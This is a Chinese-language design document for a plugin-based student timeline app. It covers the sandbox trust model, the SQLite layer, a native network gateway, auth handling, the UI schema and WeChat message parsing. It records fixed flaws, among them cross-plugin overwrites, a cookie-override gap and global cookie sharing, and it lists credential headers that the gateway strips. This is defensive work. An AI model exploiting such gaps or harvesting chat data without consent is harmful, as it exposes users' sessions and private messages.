**APK 实机测试暴露的四个问题（均已修复，见 §13.1）：**

- **`createConnection` 的 `mode` 语义反直觉 —— 这是加密库失败的真因。**
  插件 Android 源码 `Database.open()`：

  ```java
  if (_mode.equals("encryption")) { _uCipher.encrypt(_context, _file, password); }
  if (_mode.equals("decryption")) { _uCipher.decrypt(_context, _file, password); }
  ...
  _db = SQLiteDatabase.openOrCreateDatabase(_file, password, null, null);
  ```

  `'encryption'` 的意思是「把**已存在的明文库**就地转成加密库」，不是「新建加密库」。
  新建时文件还不存在（物理名是 `dbName + "SQLite.db"`，见 `CapacitorSQLite.java:346`），
  `_uCipher.encrypt` 直接失败，报出 `Failed in encryption ... SQLite.db not found`。
  **新建/打开常规加密库必须用 `'secret'`** —— 它只负责从已存储口令取密码，
  再交给 `openOrCreateDatabase` 去「打开或创建」。前提是 `setEncryptionSecret()` 已先调用。
  这个坑在纸面设计里看不出来，只有真机跑才会暴露。

- **同一 tier 内不能靠 `id` 字母序排序。** `'store.json' < 'store.sqlite'`，
  于是「无事务无索引的 JSON 文档库」抢走了「普通 SQLite」的降级名额 ——
  明明 SQLite 可用，用户却拿到了性能最差的后端。现在 `Strategy` 有显式 `order` 字段。

- **加密库与明文库不能共用文件名。** 两者曾都用 `matrix_timeline`：
  从加密策略切到明文策略时，明文连接会去打开一个 SQLCipher 加密过的文件，
  轻则 `file is not a database`，重则写坏文件。现在分为 `matrix_timeline_enc` 与 `matrix_timeline`。

- **「切换后端 = 数据丢失」是错觉，但会造成真实恐慌。**
  各后端各自持有数据，切回去就回来了。现在切换时若目标后端为空，
  会自动把数据搬过去；目标非空则明确提示不迁移。


### 5.6 生命周期

```
install → verify(sig) → 权限确认页 → granted ⊆ declared → 落 plugin_registry
        → (首次) migrate 自身命名空间 → activate
activate → 握手 → 注入 ctx → onActivate() → 注册 contributes
suspend  → 宿主回收 Worker（移动端后台被杀）→ onSuspend() 尽力保存
deactivate → 注销 → 停止调度 → 释放 VM
uninstall → 询问是否保留数据 → 删表 or 保留 orphan
```

### 5.7 信任模型：选择性信任（参考 VS Code Workspace Trust）

**权限与信任是两件正交的事**，必须拆开：

- **权限**回答「插件能做什么」——安装时确认，绑定在**沙箱实例**上。
- **信任**回答「插件里跑的代码是否被审核过」——决定代码**能不能进来**，不决定它**在哪里跑**。

| 等级 | 判定依据 | 宿主行为 |
|---|---|---|
| `signed` 已验签 | 包内**全部可执行代码**被 Ed25519 签名覆盖 | 正常激活 |
| `restricted` 受限 | 存在未签名的代码路径（远程加载 / 未签名子资源）且用户未授权 | 只激活声明式视图与自身数据读写；`ctx.evalRemote()` 与 `remoteCode.origins` 上的网络请求抛 `ETRUST` |
| `remote-trusted` 已信任远程代码 | 用户对该插件**显式**授予 | 允许加载并执行声明的远程代码（**仍然只在沙箱内**） |

manifest 侧的声明（对应 VS Code 的 `capabilities.untrustedWorkspaces` / `restrictedConfigurations`）：

```jsonc
"capabilities": {
  "untrustedRemote": "limited",            // false = 受限模式下完全不激活
  "restrictedSettings": ["autoSync"],      // 受限模式下不读写的配置项
  "remoteCode": {
    "reason": "解析规则需随平台改版热更新",   // 必须展示给用户
    "origins": ["https://rules.example.com"],
    "signature": "required"                  // 建议要求子资源签名
  }
}
```

**「间接信任的代码」在这里自然消解**：权限绑定在**沙箱实例**上而非代码上，`ctx.loadModule(id)` 加载的代码是用**加载方自己的权限**、在**加载方的沙箱里**执行的。所以「插件执行别人的代码」**永远不可能带来权限提升** —— 唯一需要把关的是「这段代码是否验签」（防供应链投毒），而不是「这是谁的代码」。这比让插件自行判定信任要干净得多。

**新增不变量**：

- **I4** 信任不能替代权限：授予远程代码信任 ≠ 授予网络权限，两者都要满足。
- **I5** 信任不能通过依赖传递升级（由 I4 直接推出）。
- **I6** 信任只决定「能否进来」，不决定「在哪跑」——远程代码永远在沙箱内。

**三条工程要求**：

1. 信任状态**常驻可见**（对应 VS Code 的受限模式徽章），用户可随时查看与撤销。
2. 授予时必须列出**来源域名 + 为什么需要 + 风险**（作者可事后改变行为、数据可能流向这些域名）。
3. 首次运行任何第三方插件时先给一个统一说明页，再逐插件确认。

信任决策持久化在 `plugin_registry.trust_level` / `trust_updated_at`，每次变更写 `audit_log` 并触发插件重载。

---

## 6. 数据层

### 6.1 SQLite 抽象：插件永远看不到 SQL

```ts
export interface DbClient {
  collection<T extends JsonObject>(name: string): Collection<T>;
  transaction<T>(fn: (tx: DbTx) => Promise<T>): Promise<T>;
  raw?<T>(sql: string, params?: unknown[]): Promise<T[]>;  // 需 db.raw 权限
}
```

宿主把查询 DSL 编译成**参数化 SQL**，字段路径只允许 manifest 里声明过的（迁移时生成 generated column + 索引）：

```ts
collection('task').find({
  and: [
    { field: 'dueAt', gte: t0, lt: t1 },
    { field: 'courseId', eq: cid },
    { not: { field: 'status', eq: 'done' } }
  ]
}, { orderBy: [{ field: 'dueAt', dir: 'asc' }], limit: 50 });
```

```sql
-- 由 manifest 的 schema 自动生成
CREATE TABLE plugin_app_matrix_connector_ecloud_task (
  id TEXT PRIMARY KEY,
  doc TEXT NOT NULL,
  created_at INTEGER NOT NULL,
  updated_at INTEGER NOT NULL,
  due_at INTEGER GENERATED ALWAYS AS (json_extract(doc, '$.dueAt')) VIRTUAL
);
CREATE INDEX ix_pamece_task_due ON plugin_app_matrix_connector_ecloud_task(due_at);
```

这样做的收益：**注入不可能、命名空间越界不可能、索引可预测**。代价：复杂分析查询要宿主提供额外的受限 API（例如 `db.aggregate`），这在学习类应用里几乎用不到。

> 已在真实 SQLite 3.37 上验证：该 generated column 上的查询**命中索引**而非全表扫描（见 [`verify-schema.py`](./verify-schema.py)）。

### 6.2 命名空间隔离

`app.matrix.timeline` → 前缀 `plugin_app_matrix_timeline_`（`[^a-z0-9]` → `_`）。所有插件表强制该前缀，宿主在编译期注入、插件无法指定。卸载时按前缀 `DROP TABLE`。

### 6.3 迁移

```sql
CREATE TABLE _migration (
  scope TEXT NOT NULL,        -- 'core' 或 'plugin:<id>'
  version INTEGER NOT NULL,
  applied_at INTEGER NOT NULL,
  PRIMARY KEY (scope, version)
);
```

- 每个 scope 独立版本线，插件升级只跑自己的迁移。
- 迁移函数必须是**幂等且可重入**的（移动端可能在中途被杀）。
- 宿主提供 `db.migration(scope).add(version, sql)`，插件不能直接改 `_migration`。
- 升级前自动做一次 `VACUUM INTO` 备份快照，失败可回滚到备份。

### 6.4 跨端 SQL 方言

只使用 SQLite 公共子集：`CREATE TABLE / INDEX`、`SELECT`、`INSERT … ON CONFLICT DO UPDATE`、`json_extract`、generated columns。**禁用**：`PRAGMA` 差异项、`ATTACH`、窗口函数之外的方言扩展（窗口函数在两端都支持，可用但保持克制）。所有 SQL 集中在 `packages/data/src/sql/`，由 `tools/conformance` 用同一套用例跑两个适配器。

> ⚠️ `@capacitor-community/sqlite` 的官方文档**未提及** generated columns / 表达式索引 / 部分索引 / `ATTACH` / FTS5，本设计对前三者有硬依赖，因此列为 P0 必做的 Spike S1（见 §13）。

### 6.5 dataBus：写入与广播

```
插件 ctx.bus.emit('ddl', 'upsert', payload)
  → 权限检查（data.write 含 'ddl'）
  → 配额检查
  → 实体 Schema 校验（manifest.contribues.entityTypes）
  → 去重/合并（dedupe_key 命中则走合并策略，不直接插入）
  → 事务内写 event + resource
  → 广播 { entity:'ddl', op:'upsert', ids:[…] }
  → 触发依赖查询失效 → UI 局部重渲染
```

**去重与合并**是 Timeline 质量的关键：`dedupe_key = hash(platform, course, normalizedTitle, dueDate±窗口)`。命中时不是覆盖，而是产生一条 **merge candidate** 交给用户确认（保留 `source` 与 `confidence` 以便回溯）。

#### 实现状态（v0.4，`packages/kernel/src/databus.ts`）

内核侧的 `DataBus` 是上述语义的**纯内存先行版**（落 SQLite 是后续的事）。
实现过程中发现并修掉了两个真实缺陷，都值得记下来：

**① 记录键必须带 `pluginId` —— 否则插件之间可以互相覆盖。**

原写法 `keyOf(type, id) = \`${type}\0${id}\`` **不含 pluginId**。两个插件写同一个
`type` + `id` 时，后者会**静默覆盖**前者。这既违反 §6.2 的命名空间隔离，
也是一条跨插件篡改通路 —— 更糟的是，没给 `id` 时宿主按**内容哈希**生成 id，
所以攻击者只要猜到对方的内容就能刻意碰撞。

现在键是 `pluginId \0 type \0 id`。跨插件**读**不受影响（`read()` 是按 `type` 遍历整张表的），
所以 Timeline 聚合照旧可用，只是不再互相顶掉。

**② 字节配额必须按 UTF-8 真实字节算，不能用 `String.length`。**

`String.length` 数的是 UTF-16 码元。一个汉字在 UTF-8 里占 3 字节，`.length` 只算 1 ——
拿它当字节配额，**中文内容的实际占用会被低估到三分之一**，配额形同虚设。
而 Matrix 的目标用户是中文场景的学生，这不是边角情况。

统一到 `packages/kernel/src/bytes.ts` 的 `byteLen()`（ASCII 走快路径，非 ASCII 才过
`TextEncoder`）。**为什么必须只有一个实现**：宿主这边算 `boundaryBytes` 与 dataBus 配额，
QuickJS 那边按 WASM 堆计入内存上限。两边口径不一致就会出现
「宿主认为还没超、沙箱已经 OOM」这类无法解释的失败。

**③ 配额统计从 O(n²) 改成增量维护。** 原 `usageOf()` 每次 `emit` 都全表重扫一遍算占用 ——
20,000 行配额下，一次同步要做两亿次序列化。配额是热路径上的判断，不能这么算。
现在维护一个 `Map<pluginId, {rows, bytes}>`，`emit` 时增量更新，`dropPlugin` 时清零，
并有一条断言「增量计数与逐条重算完全一致」守着。

### 6.6 核心 DDL

见 [`schema.sql`](./schema.sql)。要点：

- `event` 是统一模型，`kind ∈ {ddl, quiz, checkin, exam, note, custom}`，课表用 `session` 表（它有稳定的周期语义，不适合塞进 event）。
- `resource` 承载「智能资源绑定」，`role ∈ {assignment_desc, submit, slides, recording, checkin, quiz, meeting, other}`，带 `confidence` 与 `verified`。
- `event.external_id` + `UNIQUE(source, external_id)` 保证连接器同步幂等。
- `event.raw` 保存原始抓取片段/消息文本，用于解析错误回溯与重新解析（可配置保留期）。

---

## 7. 平台适配层

### 7.1 契约

```ts
export interface PlatformAdapter {
  readonly kind: 'capacitor' | 'electron' | 'web';
  readonly capabilities: ReadonlySet<Capability>;

  db:    { open(name, opts: { key?: string }): Promise<SqliteConn> };
  http:  { request(req: NativeHttpReq): Promise<NativeHttpRes> };   // 原生发出，绕过 WebView
  notify:{ schedule(n: LocalNotification): Promise<string>; cancel(id): Promise<void> };
  secure:{ get(k): Promise<string|null>; set(k,v): Promise<void>; delete(k): Promise<void> };
  bg:    { register(task: { id, intervalMin, handler }): Promise<void> };
  fs:    { read/write/list/stat(root: 'plugin-data'|'cache'|'documents', path) };
  share: { onReceive(cb: (payload: SharePayload) => void): Unsubscribe };
  app:   { info(): Promise<AppInfo>; openUrl(url): Promise<void>; openSettings(panel): Promise<void> };
}
```

`web` 适配器不是玩具：它让 `pnpm dev` 直接在浏览器里跑完整宿主（DB 用 sql.js + OPFS，通知用 Notification API），是**最高效的开发与测试路径**，也强制平台抽象保持干净。

### 7.2 插件永远不直接调 Capacitor / Electron

ESLint 规则禁止 `plugins/**` 与 `packages/{domain,ui}` 里出现 `@capacitor/*`、`electron`。所有原生能力经 `ctx.platform.*`，其背后是适配器。这条规则由 CI 强制执行。

### 7.3 各端能力清单（首版）

下列包名与版本已于设计阶段核实（详见 [附录 A](#附录-a依赖版本与已核实事实)）。

| 能力 | Capacitor 8（Android） | Electron 44（Windows） | Web(dev) |
|---|---|---|---|
| SQLite | `@capacitor-community/sqlite@8.1.1`，原生走 SQLCipher（`encrypted: true`） | `better-sqlite3-multiple-ciphers@13` in utilityProcess | sql.js + OPFS（**无加密**，dev 专用） |
| 安全存储 | `@aparajita/capacitor-secure-storage@8`（Keystore） | `safeStorage`（DPAPI，**用 async API**） | 不提供（降级为内存 + 警告） |
| 本地通知 | `@capacitor/local-notifications@8.3.1` | Electron `Notification` | Notification API |
| 后台任务 | `@capacitor/background-runner@3` → WorkManager（周期 ≥15min）+ AlarmManager 精确闹钟（需授权） | 常驻 + 启动时补算 | 无 |
| 原生 HTTP | CapacitorHttp（Native Bridge） | main process `net`/`fetch` | 浏览器 fetch（仅 dev） |
| 分享接收 | `@capgo/capacitor-share-target@8`（需改 intent-filter） | 单实例 + argv | 不支持 |
| 通知监听 | **自写原生代码**：无可用官方/社区插件（`capacitor-notificationlistener` 已 deprecated） | 不适用（可读本地库，实验性） | 不适用 |

> **需要自建原生代码的两处**（这是本项目唯一无法纯 TS 完成的部分，须预留工作量）：
> 1. Android `NotificationListenerService`（微信消息监听）。
> 2. Android 精确闹钟的授权引导与 `AlarmManager.setExactAndAllowWhileIdle` 封装。
>
> 其余能力都有现成插件。这条结论直接影响 P0/P3 的排期。

### 7.4 核心下沉到原生层（决策 D6）

> **v0.4 修订（实机验证后）**：原计划「用 Kotlin/Swift 自写 `CorePlugin`」被证明**不必要**。
> 改为：**传输层用 `@capacitor/core` 自带的 `CapacitorHttp`，策略层全部写在 TypeScript 里。**
> 结果是整个核心层 100% TypeScript，且 `connect-src 'none'` 依然成立。证据见本节末。

目标不变 —— `PlatformAdapter` 的 `http` / `secure` / `db` 三个成员在移动端**由原生实现**，
JS 侧只留一层薄客户端。变的只是「原生实现」的来源：不再是我们自己写，而是复用框架自带插件。

```
JS: core（纯 TypeScript）        Capacitor Bridge（非网络）     原生
  ├─ 权限校验（快速失败）    ─────────────────────────▶   CapacitorHttp（框架自带）
  ├─ 域名白名单 / 逐跳复检                                   Android: HttpURLConnection
  ├─ 限流 / 超时 / 大小上限                                   iOS: URLSession
  ├─ 会话注入（CapacitorCookies）                             Web: fetch（dev）
  └─ 审计落库
```

**为什么可以不自写原生**（三条均已核对源码，非推测）：

| 证据 | 位置 | 含义 |
|---|---|---|
| `this.registerPlugin(com.getcapacitor.plugin.CapacitorHttp.class)` | `Bridge.java:663` | 原生插件**无条件注册**，与 `enabled` 配置无关 |
| `getPluginConfiguration("CapacitorHttp").getBoolean("enabled", false)` | `WebViewLocalServer.java:189` | `enabled` **只控制**「是否拦截 WebView 自身的请求并改走原生」，即 fetch/XHR 补丁 |
| `const h = i("CapacitorHttp", { web: () => new m })` | `@capacitor/core` dist | JS 侧是一等公民插件，且自带 Web 实现 |

因此 **`plugins.CapacitorHttp.enabled` 保持 `false`（不变量 I7 不变）的同时，仍可直接调用
`CapacitorHttp.request()`**：传输走原生，WebView 自身依旧零网络。

设计要求的每一项都有 TS 侧落点：

| §8.1 要求 | 实现方式 |
|---|---|
| 逐跳复检白名单，最多 5 跳 | `disableRedirects: true`，在 TS 里手动跟跳并逐跳校验；响应的 `url` 字段用于识别跳转 |
| 超时（默认 15s） | `connectTimeout` + `readTimeout` |
| 响应体大小上限（默认 5MB） | 响应长度校验（超限即拒绝并审计） |
| 会话注入（凭证不出插件） | `CapacitorCookies` 插件 |
| 令牌桶限流 / 审计落库 | 纯 TS |
| 同构 Web 适配器 | 框架自带的 `CapacitorHttpPluginWeb` |

**仍然必须自写原生的部分（已大幅缩小）**：
- **通知监听**（微信消息解析的数据来源）—— 无可用插件，Android 需自写 `NotificationListenerService`。
- **可选的强化**：「凭证永不进入 JS 堆」若要做到内存 dump 级防护，vault 的加解密需原生。
  这是可选加固，不是架构必需 —— 当前用 `@aparajita/capacitor-secure-storage`（已实机验证可用）。

**安全前提（必须保持）**：`CapacitorHttp` 对**整个 WebView** 可见，包括任意 iframe。
因此「插件不能绕过网关」这条，依赖的是**插件运行在 QuickJS 沙箱里**（D1）——
沙箱 `globalThis` 没有 `Capacitor`，够不到这个插件。这也再次说明 I8（渲染层与沙箱内不得出现
`RTCPeerConnection`）与 I10（能力令牌）不是可选项：一旦将来改用 iframe 承载插件，
iframe 就能直接调用 `CapacitorHttp` 绕过白名单。

**收益**：核心层 100% TypeScript，无需为 Android/iOS 各写一份；
一致性测试无需真机即可在本机跑；完全符合「全栈 TypeScript」的原始要求。


---

## 8. 网络与认证

### 8.1 网络网关

```
ctx.net.request(req)
 → URL 校验：https only；host 精确/后缀匹配白名单；拒绝 IP 字面量
 → **剥掉调用方自带的凭证头与逐跳头**（cookie / authorization / host / content-length …）
 → 附加会话：从 auth vault 取 cookie/header 注入（插件看不到）
 → 令牌桶限流：per (pluginId, host)
 → 原生发出（移动端 CapacitorHttp / 桌面 main process）
 → 重定向逐跳复检白名单，最多 5 跳
 → 响应体大小上限（默认 5MB）、超时（默认 15s）、重试（幂等方法，指数退避 2 次）
 → 剥离 Set-Cookie 写回会话
 → 审计落库（pluginId, method, host, path, status, bytes, ms）
 → 返回给插件
```

> **请求侧凭证头必须剥掉（v0.4 修补的真实漏洞）**。原实现写的是
> `headers = { ...injected, ...req.headers }` —— 调用方只要塞一个 `cookie`，
> 就能**盖掉**核心从 vault 注入的会话 cookie。响应侧早就洗了 `set-cookie`，
> 请求侧一直是漏的，等于「前门锁了后门开着」。
>
> 现在是两道：网关**剥掉**（最后一道强制点，保证发出去的请求干净），
> 内核适配器**拒掉并报 `EPERM`**（让插件作者第一次跑就知道自己越界了）。
> 静默剥掉是不够的 —— 插件会以为自己设置成功了。
> 剥掉的事实写进审计（`headersStripped`，**只记头名不记值**），所以尝试是可见的。
> 两份禁用头清单**引用同一份常量**，不允许各写各的：清单漂移的方向通常是把某个头
> 从「剥掉」的名单里漏掉，也就是把后门重新打开。

`packages/net` 与 `packages/auth` 是**唯一**允许出网的模块，CI 用依赖规则强制。

#### 实现状态（v0.4，已在本机跑通 83 项一致性断言）

代码在 **`apps/shell/src/core/`**（纯 TypeScript，无 Kotlin/Swift）：

| 文件 | 职责 |
|---|---|
| `types.ts` | v1 契约：请求/响应、9 个错误码、审计条目、能力令牌、`Transport` 接口 |
| `allowlist.ts` | URL 校验与主机匹配 |
| `ratelimit.ts` | per (pluginId, host) 令牌桶，桶数有界 |
| `tokens.ts` | 能力令牌与**代际**撤销 |
| `audit.ts` / `audit-store.ts` | 环形缓冲 + 落盘（走 kv 后端） |
| `transport.ts` | `CapacitorTransport`（原生）/ `MockTransport`（测试与自检） |
| `session.ts` | 会话 cookie jar —— 凭证不进插件 |
| `vault.ts` | 按插件命名空间隔离的凭证库，接 `SecureStore` |
| `gateway.ts` | 上图的编排 |
| `plugin-host.ts` | **内核 ↔ 核心层的唯一接缝**：把 broker 的 `fetch(req, ctx)` 翻成 `net.request` + 能力令牌；信任撤销联动令牌撤销 |
| `index.ts` | **唯一窄入口** `Core.call(token, method, payload)` |
| `conformance.test.ts` | 87 项断言，`node src/core/conformance.test.ts` 直接跑 |
| `plugin-api-diff.test.ts` | 15 项**跨包**断言：错误码空间、头策略、端到端链路 |

**逐条对应上图**：全部实现。其中三处值得单独说：

- **逐跳复检靠 `disableRedirects` 实现**。已核对原生源码：`HttpRequestHandler.java:392` 读取该参数、`:422` 应用、最终落到 `CapacitorHttpUrlConnection.setInstanceFollowRedirects(!disableRedirects)`。所以关掉自动跳转是真的关掉了，不是纸面约定。
- **大小上限按 UTF-8 字节算**，不是 `string.length`。中文一个字 3 字节，按 length 算会低估 3 倍 —— 这一条有专门的测试。
- **审计刻意不记错误文案、不记完整 URL、不记请求头与请求体**。只记 host + path + 状态 + 字节数 + 耗时 + 判定结果。因为日志里最可能夹带 token / 口令 / 会话 cookie 的正是被省掉的那几项。

**与设计的偏差（如实记录）**：

1. 位置是 `apps/shell/src/core/` 而不是 `packages/net`。当前是单应用 + 隔离模块，抽成 npm workspace 是机械操作，见 §2 的说明。
2. **撤销用「代际计数」而不是时间戳**。时间戳方案在「撤销 → 恢复 → 重新签发」的组合下会让旧令牌复活（`issuedAt <= revokedAt` 的判定在恢复后失去依据）。代际计数没有这个问题，且错误信息能区分「无效」与「已被撤销」。
3. **审计是合并写**（攒 1.5s 写一次）。好处是请求延迟不受影响，代价是**崩溃时最多丢一个 flush 周期的记录**。要彻底避免需同步落盘，那会牺牲延迟 —— 当前取「延迟优先」。
4. **JSON 响应体会经历一次 parse → stringify 往返，不是线上原始字节。**
   原因：`CapacitorHttp` 在 content-type 是 JSON 时**忽略 `responseType`**，强制解析成对象。
   原生侧证据 `HttpRequestHandler.java:250-252`（那个 `else if` 分支在 `switch (responseType)` **之前**，
   所以连 `arraybuffer` 也躲不掉）；Web 侧行为完全一致。后果：
   大整数可能静默丢精度（> 2^53-1）、键序可能变化、`1.0` 会变成 `1`。
   **处置**：如实上报 `jsonRoundTrip` 标志，并扫描结果中仍超过 `Number.MAX_SAFE_INTEGER`
   的整数字面量给出 `bigIntRisk` 计数告警。这不能还原原始值，但能让调用方知道
   「你拿到的数可能已经不是服务端那个数」。
   附带影响：§8.1 的「响应体大小上限」量的是**往返后的字符串**而非线上字节数 ——
   用于防超大响应足够，但不能当流量计费依据。
   好消息是**两端行为同构**，所以「同一套用例跑两边」这条测试策略依然成立。

**尚未实现（不在本轮范围）**：

- §8.2 的**认证代理**：`SessionHandle` 与 cookie jar 已就位，但「宿主弹登录界面 → 加密存入 vault → 原生代填」这条链路没做，OAuth / Chrome Custom Tabs 也没做。
- 白名单目前**默认空**（与 D7「默认拒绝」一致），由用户在调试面板里加。插件级的白名单声明（插件清单里写自己需要哪些域名、安装时展示给用户）属于插件运行时，P1。

### 8.2 认证代理

插件只拿句柄，永不接触凭证：

```ts
const h = await ctx.auth.login('shtu-sso');       // 宿主弹自己的登录界面
const r = await ctx.net.request({ url, session: h });
```

- **OAuth / SSO**：桌面用 `BrowserWindow({ partition:'persist:auth-<p>', sandbox:true })`，命中成功谓词后从 partition 读 cookie；移动端用 Chrome Custom Tabs + deep link 回调。
- **表单登录**（Gradescope / Piazza / E云 这类）：宿主用自己的 UI 收集一次账号密码 → 立即加密存入 vault → 之后所有表单代填都在原生层完成。插件只看到 `SessionHandle`。
- **刷新**：宿主按 provider 维护刷新策略；Worker 重启后句柄失效，插件重新 `auth.session(provider)` 换取。
- `SessionHandle` 是进程内随机字符串，映射到内存表；持久化的只有加密后的 cookie jar。

#### ⚠️ 实现期发现：原生 cookie 存储是**进程全局**的（v0.4）

这一条推翻了上面「按插件隔离会话」的隐含假设，必须记下来。

**事实链**（全部来自可复查的源码）：

| # | 位置 | 内容 |
|---|---|---|
| 1 | `Bridge.java:661` | `registerPlugin(CapacitorCookies.class)` —— **无条件注册**，与任何 `enabled` 配置无关 |
| 2 | `PluginHandle.java:64-65` | 构造函数**无条件调用** `load()` |
| 3 | `CapacitorCookies.java:26` | `load()` 里执行 `CookieHandler.setDefault(this.cookieManager)` |
| 4 | JDK 语义 | `CookieHandler.setDefault` 设的是 **JVM 全局**默认 handler |
| 5 | JDK 语义 | `HttpURLConnection`（即 `CapacitorHttp` 的底层）**自动**使用全局 handler 收发 cookie |

**结论**：cookie 的自动持久化与自动附加是**框架白送的**，我们从 JS **关不掉**。
于是：

- ✅ 「凭证不进插件」仍然成立 —— 我们会在返回前剥掉响应里的 `set-cookie`（见 §8.1），
  而且 cookie 是**按域名**存储的，`document.cookie` 读不到别的域的 cookie
- ❌ **跨插件的 cookie 隔离在传输层不成立** —— 插件 A 在 `example.com` 上的会话 cookie，
  会被插件 B 对 `example.com` 的请求自动带上。这是**搭便车**（piggyback），不是泄漏，
  但对「插件之间互不影响」这条设计目标是实质性的削弱

**当前的处置**（不是最终解，是如实记录 + 可观测）：

1. 提供两个会话后端，运行时可切换，调试面板里能直接对比：
   - `memory`（**默认**）：cookie 只存在 JS 内存里，**不写进**原生存储。隔离性更好，
     但挡不住原生层自动附加它自己已有的 cookie。
   - `capacitor-cookies`：走原生存储，换来**精确撤销**（登出时只删本会话写的那几个，
     而不是 `clearAllCookies()` 把全进程一锅端）。
2. 不假装这个问题不存在 —— 调试面板里直接写明了这条限制。

**真正的解法**（未做，需原生）：在核心层自写一个**按插件分区**的 `CookieHandler`
替换掉全局那个，或者干脆让原生请求绕过全局 handler。
这属于「必须自写原生代码」的范畴 —— 与 §7.3 里通知监听、精确闹钟并列，
是**目前已知的第三处**纯 TS 做不到的地方。

#### 认证代理的实现状态

| 能力 | 状态 |
|---|---|
| `SessionHandle` 句柄与插件隔离 | ✅ 已实现 |
| Set-Cookie 收走 + 从响应里剥掉 | ✅ 已实现 |
| 按 (会话, 主机) 精确撤销 | ✅ 已实现（仅 `capacitor-cookies` 后端） |
| 宿主弹登录界面 → 加密存 vault → 原生代填 | ❌ 未实现 |
| OAuth / SSO / Chrome Custom Tabs | ❌ 未实现 |

---

## 9. UI：Schema、组件注册表、布局引擎

### 9.1 布局文档（纯数据）

```jsonc
{
  "schemaVersion": 1,
  "id": "home",
  "theme": { "mode": "auto", "seed": "#4F6BED", "radius": 12 },
  "density": "comfortable",
  "regions": {
    "mobile":  { "type": "stack", "gap": 12, "children": [
      { "id": "m1", "component": "timeline.today",
        "from": "plugin:app.matrix.timeline",
        "bind": { "items": "query:events.today", "filter": "state.uiFilter" },
        "style": { "card": "elevated", "accent": "primary" } },
      { "id": "m2", "component": "timetable.nextClass",
        "from": "plugin:app.matrix.timetable", "span": { "mobile": 1 } }
    ]},
    "desktop": { "type": "grid", "columns": 12, "children": [ /* … */ ] }
  }
}
```

三条硬约束：

1. **`component` 只能引用注册表里已注册的组件**，未注册 → 渲染占位卡片并提示「需要安装插件 X」。
2. **`bind` 是声明式查询，不是表达式代码**。宿主执行查询并把结果注入 props。没有 `eval`、没有模板字符串插值。
3. **`style` 是枚举化的 token 名**（`elevated` / `flat` / `outlined`），不是任意 CSS。

因此布局 JSON 可以安全地导出、分享、二维码传递、导入他人配置 —— 这是「视觉模块化」能成为传播点的前提。

### 9.2 组件注册表

```ts
ui.registerComponent({
  name: 'timeline.today',
  owner: 'app.matrix.timeline',
  propsSchema: { /* JSON Schema */ },      // 布局编辑器据此自动生成属性面板
  render: (props, ctx) => ReactNode,        // first-party：直接 React 组件
  // 第三方：{ kind: 'remote', entry: 'component.js' } → 宿主分配 iframe 矩形
});
```

第三方组件渲染在一个由宿主预留的矩形内的 iframe 里，宿主通过 postMessage 传 props、收事件。**插件 UI 崩溃不会拖垮宿主**（这是 iframe 方案最大的工程收益，不只是安全）。

### 9.3 主题与密度

设计 token 走 CSS 自定义属性：`--mt-space-*`、`--mt-radius-*`、`--mt-color-*`、`--mt-font-*`。密度是根节点上的一个乘数（`compact 0.875 / comfortable 1 / spacious 1.15`）。主题由 `seed` 颜色生成色阶（HCT/OKLCH），保证深浅色都可读。全部可序列化 → 随布局一起导出。

### 9.4 布局编辑器

`plugins/layout-editor` 是一个 first-party 插件：拖拽排序、按 `propsSchema` 自动生成属性面板、实时预览、导出/导入 JSON、内置若干预设（「考试周」「极简」「信息密集」）。用户不需要理解 Schema。

---

## 10. Timeline 与智能资源绑定

### 10.1 领域模型

```
course ──1:N── session（一次课，有 start/end/location）
course ──1:N── event（ddl / quiz / checkin / exam / note / custom）
event  ──1:N── resource（role: assignment_desc | submit | slides | recording | checkin | quiz | meeting）
session ─1:N── resource（slides / recording / meeting）
```

### 10.2 资源绑定策略（按优先级）

1. **结构化来源**：连接器从平台对象里直接拿到（Gradescope 的 assignment 对象同时含题目页与提交页 URL）。`confidence = 1.0, verified = 1`。
2. **课程级模板**：同一门课历史绑定过的 URL 模式（`/courses/<cid>/assignments/<aid>` → 提交页 `/submissions/new`），用模式推导。`confidence ≈ 0.8`。
3. **启发式**：链接文本匹配（"Submit"、"提交"、"上传"、"讲义"、"Slides"）。`confidence ≈ 0.5`，UI 上标注「推测」。
4. **用户确认**：任何低置信度绑定在详情页提供「这是提交链接吗？」的一次点击确认，确认后写回模式库。

**交互约定**：Timeline 卡片主按钮 = 提交链接（`role=submit`），长按/展开 = 作业要求、讲义、签到、Quiz 入口。没有提交链接时主按钮降级为「作业要求」。

### 10.3 课前提醒流水线

```
每日 02:00（或 App 启动时补算）
 → 取未来 36h 的 session
 → 为每条生成 reminder(fire_at = start_at - leadMin)
 → 到期前 30min：用连接器的会话预取 slides/PPT → 存本地缓存 → resource 落库
 → 触发通知：「10:00 教学中心 302｜讲义已就绪（点击打开）」
```

降级链：精确闹钟（已授权）→ WorkManager 周期任务（最小间隔 15 分钟，误差可达 ±15min）→ App 启动补推 + 应用内横幅。用户可见地说明当前精度，不承诺准点。宿主在 `schedule.at()` 的返回值里回传 `precision`，插件应据此调整文案。

### 10.4 微信 / 聊天解析管道

```
[输入源]
  A. 系统分享到 Matrix（主路径，全平台）
  B. 手动粘贴文本（主路径，兜底）
  C. Android NotificationListenerService（增强，需系统设置授权）
  D. Windows 本地微信库读取（实验性，默认关闭，需显式授权）

[管道] parser-wechat 插件（QuickJS 沙箱内）
  1. 归一化：去引用、去表情、合并多行
  2. 规则层：DDL 关键词 + 中文时间解析（"下周三 23:59"、"明天中午前"）+ 链接抽取
  3. 模型层（可选）：ctx.llm.complete() → 宿主本地小模型（llama.cpp WASM / 端侧推理）
  4. 输出候选：{ title, dueAt, courseHint, links[], confidence, evidence }
  5. bus.emit('ddl.candidate', …)   ← 注意：候选不是最终数据

[宿主]
  去重 → 通知「发现 1 条可能的 DDL」→ 确认卡片（可编辑）→ 用户确认 → 写 event
```

**隐私红线**：聊天原文只在设备内处理；`llm.complete` 是宿主能力且强制本地推理；原始文本默认保留 7 天后自动清除（可配置）。绝不默认上传。

---

## 11. 安全与合规

| 面 | 措施 |
|---|---|
| 代码隔离 | QuickJS(WASM) 真隔离；UI 插件用不透明源 iframe / WebContentsView + partition；**一个插件 VM 独占一个 WASM 模块实例**（D9） |
| 网络 | 核心层（移动端原生 / 桌面 main process）是唯一出口；域名白名单逐跳校验；SSRF 防护；UI 层与**插件层**都无网络原语。`connect-src 'none'` 已在 P0-S2 静态验证可行（见 §13 Spike S2） |
| 信任 | 见 §5.7：默认拒绝运行时远程代码；逐插件、显式、可撤销的信任授予；受限模式徽章常驻可见 |
